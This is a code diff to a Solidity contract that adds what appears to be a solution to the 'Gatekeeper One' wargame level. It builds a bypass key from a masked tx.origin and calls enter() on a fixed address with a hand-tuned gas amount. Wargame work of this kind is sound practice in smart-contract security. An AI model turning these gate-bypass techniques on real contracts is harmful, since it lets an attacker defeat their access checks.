@@ -23,6 +23,9 @@ contract Building {
   uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
   bool private top = true;
 
+  //gatekeeper one   
+  bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
+
   constructor() {
     // what should we do on deploy?
     owner = msg.sender;
@@ -101,6 +104,14 @@ contract Building {
     else return false;
   }
 
+  function gateKeeperOne() public {
+      address addr = 0x03BbC4da503ED141c41Aa8E612420C38bf684D4F;
+      address payable addrP = payable(addr);
+      (bool result, ) = addrP.call{gas: 24827}(abi.encodeWithSignature("enter(bytes8)", key));
+      require (result);
+      //57.337
+      //24.573
+  }
 
   // to support receiving ETH by default
   receive() external payable {
